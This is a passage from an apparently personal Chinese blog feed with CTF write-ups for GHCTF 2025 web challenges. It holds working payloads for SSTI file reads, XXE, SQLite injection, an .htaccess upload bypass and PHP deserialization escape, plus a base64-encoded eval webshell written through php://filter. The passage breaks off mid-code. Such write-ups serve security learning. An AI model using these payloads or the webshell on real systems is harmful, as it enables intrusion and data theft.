string">"\n分类结果:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"白名单:"</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>whitelist<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"黑名单:"</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>blacklist<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#白名单: [abacefhijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$^&amp;*()+\-=\[\]{};\'\\:"|,&lt;&gt;?~`]</span><span class="token comment">#黑名单: 0123456789g%_./</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/23fbef18d9d732151c1eb71ccc16c3fb.png"></p><p>测出被ban的词后用fenjing即可。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHctf</title>
      <link href="/2025/03/23/uploadssti/"/>
      <url>/2025/03/23/uploadssti/</url>
      
        <content type="html"><![CDATA[<h3 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h3><p><code>{{7*7}}</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5c1585df838c3be2d74b2517d3bfdf72.png"></p><p><code>{{lipsum["\x5f\x5fglobals\x5f\x5f"]["\x6f\x73"]["environ"]}}</code></p><pre class="line-numbers language-none"><code class="language-none">'FLAG': 'no_FLAG'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>哭（</p><pre class="line-numbers language-none"><code class="language-none">{{ lipsum["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/fla\x67").read() }}NSSCTF{c9d3afc7-3d4c-47e7-a932-3da8e41fcef7}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其实还有一个原因是黑名单有的过滤了__有的没有，猜想就是用没过滤的+\x5f绕过w~</p><p>试了半天，拼尽全力终于战胜（</p><hr><h3 id="﹏"><a href="#﹏" class="headerlink" title="(>﹏<)"></a>(&gt;﹏&lt;)</h3><p>XXE攻击</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node2.anna.nssctf.cn:28874/ghctf -d "xml=]&gt;%26xxe;"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e032c5afea78de00f476099453479a55.png"></p><hr><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h3><p>！！！！！背景是哀酱啊啊啊啊，美如画！！！</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?id=1  order by 5 --?id=1 union select 1,2,3,4,5 --<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>卡住了<del>（我甚至还把sqllabs的解翻了一遍</del></p><p>就在此时！</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2359dbabf950a910ca1fff54e6391b8c.png"></p><p><del>我看见typora好像还有一个sql()</del></p><p><a href="https://xz.aliyun.com/news/8220?time__1311=YqUxg7DQi=30HRx+hDAr4Ix7wh40OOi8bD&amp;u_atoken=21551cc94d925b5492907d3476e869fe&amp;u_asig=1a0c399817413691777233459e003e">文章 - sqlite注入的一点总结 - 先知社区</a></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>sqlite_version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token keyword">sql</span> <span class="token keyword">from</span> sqlite_master<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/38eb1be973f1297beab92a28e79870d7.png"></p><p>直接梭哈！</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?id=1 union select 1,2,3,4,flag from flagNSSCTF{Funny_Sq11111111ite!!!}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="Popppppp"><a href="#Popppppp" class="headerlink" title="Popppppp"></a>Popppppp</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span><span class="token class-name type-declaration">php</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$i</span><span class="token punctuation">;</span>    <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 检查前三位是否为'666'，且第四位为非数字字符</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'666'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Found valid string: <span class="token interpolation"><span class="token variable">$str</span></span>\n"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"MD5(MD5(<span class="token interpolation"><span class="token variable">$str</span></span>)) = <span class="token interpolation"><span class="token variable">$hash</span></span>\n"</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">?</span><span class="token operator">&gt;</span>    <span class="token comment">#Found valid string: 213</span><span class="token comment">#MD5(MD5(213)) = 666ca9a2be31fd949cb9b55686caef9a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>好多字。。。不想看，遂卒（</p><hr><p>回过头来想好吧其实主要可能是方向错了，我一直没往原生类那儿想，已经被system洗脑了，没咋遇过用glob的pop。。。（</p><hr><h3 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h3><p>魔改一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"3"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token operator">?</span><span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">curl -X POST http://kkk:8999/ -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/65bc6d67683abe112de87aae84b48754.png"></p><p>发<code>?file=index.php</code>全给我回过来了，说明ok了</p><p>从伪协议到漏洞然后试了好多也不行。。。</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node2.anna.nssctf.cn:28308/?file=/etc/passwd/ -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"#有返回，但并没有什么用（<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/wangxuanyang_zer/article/details/134656494">file_get_contents() 函数详解与使用_php file get contents-CSDN博客</a>从这里感觉要用反弹shell，能访问网址</p><p>真的很崩溃呜呜呜呜呜呜呜，卒（</p><hr><h3 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h3><p>我基本照着文件上传大全都试了一遍，还是不行。。。而且直接上传pass.gif真不行，.use.ini也没前置php，好像只能用.htaccess。。。但真的不成功。。。一筹莫展。</p><p>然后疯狂bing。。。。。找到篇文章。。。</p><p><a href="https://github.com/MrWQ/vulnerability-paper/blob/master/skill/Apache_%E7%9A%84._htaccess_%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7.md">vulnerability-paper/skill/Apache_的._htaccess_利用技巧.md at master · MrWQ/vulnerability-paper</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/05df411ad18d80601089f6fcc2a43ca7.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename=".htaccess"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/gif</span></span>#define width 1337#define height 1337  SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/329237c105a25e04ffd2284fe4f510e1.png"></p><hr><h3 id="Escape！"><a href="#Escape！" class="headerlink" title="Escape！"></a>Escape！</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isadmin</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$isadmin</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isadmin</span><span class="token operator">=</span><span class="token variable">$isadmin</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">#要通过只要isadmin=true就有机会</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">setSignedCookie</span><span class="token punctuation">(</span><span class="token variable">$serializedData</span><span class="token punctuation">,</span> <span class="token variable">$cookieName</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'user_token'</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fake_secretKey'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$signature</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$serializedData</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serializedData</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'|'</span> <span class="token operator">.</span> <span class="token variable">$signature</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token variable">$cookieName</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置有效期为1小时</span><span class="token punctuation">}</span><span class="token variable">$User</span><span class="token operator">=</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$User_ser</span><span class="token operator">=</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$User</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setSignedCookie</span><span class="token punctuation">(</span><span class="token variable">$User_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#用这种方法加工</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先注册一个瞄一眼</p><pre class="line-numbers language-none"><code class="language-none">Cookie: user_token=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InFpbmciO3M6NzoiaXNhZG1pbiI7YjowO318NDNjMDhhZjJkYjgxZDI3OTg1YzA2MjgxMTE5ZjBhNDg0NmRlMGUzMmZlNjA3MmE0NTM0YWMzMWMyMDU4NzQ5Mw==O:4:"User":2:{s:8:"username";s:4:"qing";s:7:"isadmin";b:0;}|43c08af2db81d27985c06281119f0a4846de0e32fe6072a4534ac31c20587493<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>尝试了很多方法都无法把secretKey搞出来，有点懵。。。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$lists</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sleep"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"and"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"||"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"union"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$lists</span> <span class="token keyword">as</span> <span class="token variable">$list</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$list</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">#echo $c;</span>    <span class="token keyword">return</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想到了[安洵杯 2019]easy_serialize_php这道题。印象很深因为我当时一直在数那个字符串的个数试图凑出跟wp一样的答案。。。</p><p>ww具体的原理自己看吧<a href="https://blog.csdn.net/qq_45521281/article/details/107135706">PHP反序列化字符逃逸详解_php filter字符串溢出-CSDN博客</a></p><p>要多出来<code>";}s:7:"isadmin";b:1}</code>共21个字符，用最短的and(与error差两个)和flag(1个)，即10个and和1个flag。</p><p>so,用<code>flagandandandandandandandandandand";s:7:"isadmin";b:1;}</code>当username注册再登就行了，他就会变成下面那样就覆盖了就不用搞token了ww</p><pre class="line-numbers language-none"><code class="language-none">Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU1OiJlcnJvcmVycm9yZXJyb3JlcnJvcmVycm9yZXJyb3JlcnJvcmVycm9yZXJyb3JlcnJvcmVycm9yIjtzOjc6ImlzYWRtaW4iO2I6MTt9IjtzOjc6ImlzYWRtaW4iO2I6MDt9fGVhMWVkOWRmNTVkNjJhNzdhNGU0M2JhMTA4ZTBmYzVhNWYzMDc3ZjVmM2Y0NzkxMTVhNTM4MmZiMDJkNWYxYjM=O:4:"User":2:{s:8:"username";s:55:"errorerrorerrorerrorerrorerrorerrorerrorerrorerrorerror";s:7:"isadmin";b:1;}";s:7:"isadmin";b:0;}|ea1ed9df55d62a77a4e43ba108e0fc5a5f3077f5f3f479115a5382fb02d5f1b3#被顶出来的";s:7:"isadmin";b:0;}不再执行，payload顺利逃出waf。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/aa05a1a7ccb4777f50b47d5acfaebc56.png"></p><p>终于不报错了，我要哭了QAQ</p><p>尝试传🐎没效果。。。我恨</p><p><del>找了半天不知道哪错了，直到发现忘打开dashboard.php源代码了，呃呃</del></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">isadmin</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tmp/admin.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">.=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[<a href="https://www.cnblogs.com/hithub/p/16849600.html">伪协议绕过死亡代码</a></p><pre class="line-numbers language-none"><code class="language-none">filename=php://filter/write=convert.base64-decode/resource=m.php&amp;txt=aPD9waHAgcGhwaW5mbygpOw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5aec9309f1a45f85d008cb865247190f.png"></p><p>okk</p><p>写个🐎</p><pre class="line-numbers language-none"><code class="language-none">filename=php://filter/write=convert.base64-decode/resource=qaq.php&amp;txt=aPD9waHAgQGV2YWwoJF9QT1NUWyJwYXNzIl0pOw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4a3a4529cb0ba2f98d9c5f8314566d8f.png"></p><p>嘻嘻</p><hr><p>总之这次还有一个教训就是有的不会的可以先放。。。一共7天我可能有四五天在看web3和5，因为总感觉差临门一脚了（</p><p>实在不想研究了，感觉自己的知识面还是窄，天知道pickle出来时我一万个后悔，早知道听学姐的把[HFCTF 2021 Final]easyflask给做了，但当时太懒了（</p><p>总之出wp在复现一遍吧。。<del>现在对电脑有点PTSD了，要燃成舍利子了。。。</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8c5d17457a5ae0c6b7956c15041953fd.png"></p><hr><p>sorry我忘加web标签了，祸不单行。。。。。。。。。。。。。。。。。。。。这有什么改的方法吗（哭</p><hr><p>官方wp：[GHCTF2025 Web Write Up.pdf](file:///D:/Downloads/GHCTF2025 Web Write Up.pdf)</p><h3 id="GHCTF-2025-ezzzz-pickle"><a href="#GHCTF-2025-ezzzz-pickle" class="headerlink" title="[GHCTF 2025]ezzzz_pickle"></a>[GHCTF 2025]ezzzz_pickle</h3><blockquote><p>在 <code>/proc</code> 下，每个正在运行的进程都有一个以其进程 ID（<code>pid</code>）命名的目录。例如，<code>/proc/1</code> 对应进程 ID 为 1 的进程。<code>/proc/[pid]/environ</code> 文件存储了对应进程的环境变量信息。</p><p>进程的环境变量包含了许多重要信息，如系统路径（<code>PATH</code>）、用户信息（<code>USER</code>、<code>HOME</code>）、语言设置（<code>LANG</code>）等，这些环境变量会影响进程的运行方式和行为。</p><p>进程 ID 为 1 的进程通常是系统初始化进程（在传统的 SysV init 系统中是 <code>init</code> 进程，在使用 systemd 的系统中是 <code>systemd</code> 进程），它是所有其他进程的祖先进程，负责启动和管理系统的其他进程。</p></blockquote><p>弱密码</p><p>环境变量读取，同是<code>/docker-entrypoint.sh</code>，或者读取<code>/proc/1/environ</code></p><p><a href="https://www.cnblogs.com/Junglezt/p/18117469">文件包含之/proc/self/environ - Junglezt - 博客园</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding<span class="token keyword">import</span> pickle<span class="token keyword">import</span> hmac<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> time<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_key_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#从环境变量获取密钥和IV</span>    key <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#39;SECRET_key&amp;#39;).encode()</span>    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#39;SECRET_iv&amp;#39;).encode()</span>    <span class="token keyword">return</span> key<span class="token punctuation">,</span> iv<span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#39;encrypt&amp;#39;):</span>    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 